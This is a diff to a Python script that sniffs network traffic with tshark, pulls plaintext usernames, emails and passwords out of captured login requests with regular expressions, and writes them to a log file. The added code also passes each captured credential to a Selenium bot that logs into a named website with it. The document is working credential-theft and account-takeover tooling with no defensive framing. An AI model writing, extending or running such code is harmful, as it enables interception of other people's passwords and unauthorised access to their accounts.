@@ -1,13 +1,17 @@
 # please read test.py for current status of project
 
 import subprocess, re
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import WebDriverWait
 
 def get_data(cmd):
+  # needs work ALSO CHECK: 'cmd' -a duration
   process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True) #, universal_newlines=True
   for line in iter(process.stdout.readline, b""):
     if "Capturing" in str(line):
       return
-    elif line is not b'' or not None or not b' ':
+    elif line not in [None, '', ' ']:
       return clean_data(str(line))
     else:
       return
@@ -17,7 +21,7 @@ def clean_data(line):
   #parser for extracting data, returns dict
   #format: {site:site-address, user:user-data, pass:pass-data}
 
-  match_str = r"((user)|(email))[A-Za-z]*=[A-Za-z0-9]*&(pass)[A-Za-z]*=[A-Za-z0-9]*"
+  match_str = r"((user)|(email))[A-Za-z]*=[A-Za-z0-9]*(%40)?[a-zA-Z.]*&(pass)[A-Za-z]*=[A-Za-z0-9]*"
   ip_addr_str = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
 
   user_pass = re.search(match_str, line).group()
@@ -26,7 +30,7 @@ def clean_data(line):
 
   user = ''.join(user.split('=')[1:])
   passw = ''.join(passw.split('=')[1:]) # might have = in pass
-
+  user = user.replace('%40','@')
   # ((user)|(email))[A-Za-z]*=[A-Za-z0-9]*&(pass)[A-Za-z]*=[A-Za-z0-9]* for user/pass
   # ^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$ for IP address
 
@@ -77,9 +81,26 @@ def sniff():
   print(cmd) # final query in tshark
 
   while True:
-    print(get_data(cmd))
+    #print(get_data(cmd))
+    data_read = get_data(cmd)
+    try:
+      print(data_read)
+      with open("log_passw.txt","a") as f:
+        f.write(f"{data_read['site']}\t{data_read['user']}\t{data_read['pass']}\n")
+        bot(data_read['user'],data_read['pass'])
+    except TypeError:
+      pass
 
-
+def bot(ussr,passw):
+  url = r"http://findfriendz.com/login.php"
+  browser = webdriver.Chrome("chromedriver.exe")
+  browser.get(url)
+  username = browser.find_element_by_id(id_='emailid')
+  password = browser.find_element_by_id(id_='password')
+  username.send_keys(ussr)
+  password.send_keys(passw)
+  password.send_keys(Keys.RETURN)
+ 
 
 if __name__ == "__main__":
   sniff()
